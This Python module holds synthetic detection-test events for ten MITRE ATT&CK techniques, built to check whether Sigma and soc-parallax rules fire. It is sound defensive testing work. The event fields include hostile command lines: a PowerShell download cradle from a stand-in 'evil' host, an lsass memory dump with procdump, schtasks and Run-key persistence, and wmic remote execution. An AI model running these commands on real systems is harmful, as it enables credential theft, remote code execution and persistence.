"""Curated technique library: MITRE ATT&CK technique_id -> a hand-crafted
synthetic event that should trigger a real detection rule for that
technique, if one exists in a given backend.

Scope, stated plainly: this is 10 techniques, not the ~600+ in the full
ATT&CK matrix. Each entry is annotated with which backend(s) this pass
actually has real rule coverage for — SIGMA_TESTED means a real vendored
Sigma rule (sigma_rules/) was checked against this exact synthetic event,
not "checked against the full Sigma corpus" (which has thousands of rules
this project doesn't vendor or evaluate). Growing this list is exactly
that: hand-crafting one more realistic event + finding/vendoring one more
real rule, per technique — no shortcut, which is why it's small and honest
rather than large and unverified.
"""
from __future__ import annotations

from .schemas import SyntheticEvent

# Which techniques below have been checked against a real, vendored Sigma
# rule in this pass (sigma_rules/*.yml). Not present here != "Sigma can't
# detect it" — just "not tested against a real rule in this project yet."
SIGMA_TESTED = {"T1059.001", "T1053", "T1202", "T1003", "T1547"}

# Which techniques below have a corresponding rule in soc-parallax's
# app/detect/signals/rules.py (verified live in that repo's own test suite,
# see Pyhroff/soc-parallax backend/tests/test_detection_coverage.py).
SOC_PARALLAX_TESTED = {
    "T1059.001", "T1566", "T1218", "T1055", "T1105",
    "T1003", "T1547", "T1053", "T1021",
}

_PS = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
_WINWORD = r"C:\Program Files\Microsoft Office\root\Office16\winword.exe"
_RUN_KEY = r"HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Updater"

TECHNIQUES: dict[str, SyntheticEvent] = {

    "T1059.001": SyntheticEvent(
        "T1059.001", "Encoded PowerShell command line",
        {"event_type": "process", "Image": _PS,
         "CommandLine": "powershell.exe -enc JABzAD0AT...",
         "User": "jdoe", "host": "WKS01"}),

    "T1566": SyntheticEvent(
        "T1566", "Office application spawns a shell (classic phishing payload)",
        {"event_type": "process", "Image": _PS, "ParentImage": _WINWORD,
         "CommandLine": "powershell.exe -NoP -W Hidden",
         "User": "jdoe", "host": "WKS01"}),

    "T1218": SyntheticEvent(
        "T1218", "Living-off-the-land binary execution (rundll32 with args)",
        {"event_type": "process", "Image": r"C:\Windows\System32\rundll32.exe",
         "CommandLine": "rundll32.exe shell32.dll,ShellExec_RunDLL", "host": "WKS01"}),

    "T1055": SyntheticEvent(
        "T1055", "Unusual service-to-shell parent chain",
        {"event_type": "process", "Image": r"C:\Windows\System32\cmd.exe",
         "ParentImage": r"C:\Windows\System32\services.exe",
         "CommandLine": "cmd.exe /c whoami", "host": "WKS01"}),

    "T1105": SyntheticEvent(
        "T1105", "In-line download cradle in a command line",
        {"event_type": "process", "Image": _PS,
         "CommandLine": "powershell -c (New-Object Net.WebClient)"
                        ".DownloadString('http://evil/a.ps1')",
         "host": "WKS01"}),

    "T1003": SyntheticEvent(
        "T1003", "Credential-dumping tool observed",
        {"event_type": "process", "Image": r"C:\Users\Public\procdump.exe",
         "CommandLine": "procdump.exe -ma lsass.exe lsass.dmp", "host": "WKS01"}),

    "T1547": SyntheticEvent(
        "T1547", "Autostart (Run key) registry modification pointing to AppData\\Roaming",
        {"event_type": "registry_set", "TargetObject": _RUN_KEY,
         "Details": r"C:\Users\jdoe\AppData\Roaming\Updater\updater.exe",
         "EventData": {"TargetObject": _RUN_KEY}, "host": "WKS01"}),

    "T1053": SyntheticEvent(
        "T1053", "Scheduled task creation via schtasks.exe",
        {"event_type": "process", "Image": r"C:\Windows\System32\schtasks.exe",
         "CommandLine": "schtasks.exe /create /tn Updater /tr evil.exe /sc onlogon",
         "User": "jdoe", "host": "WKS01"}),

    "T1021": SyntheticEvent(
        "T1021", "Remote process execution via wmic (lateral movement)",
        {"event_type": "process", "Image": r"C:\Windows\System32\wbem\wmic.exe",
         "CommandLine": 'wmic /node:10.0.0.5 process call create "cmd.exe /c whoami"',
         "host": "WKS01"}),

    "T1202": SyntheticEvent(
        "T1202", "rundll32.exe launched with no parameters (Cobalt Strike beacon pattern)",
        {"event_type": "process", "Image": r"C:\Windows\System32\rundll32.exe",
         "CommandLine": r"C:\Windows\System32\rundll32.exe",
         "ParentImage": r"C:\Windows\explorer.exe", "host": "WKS01"}),
}
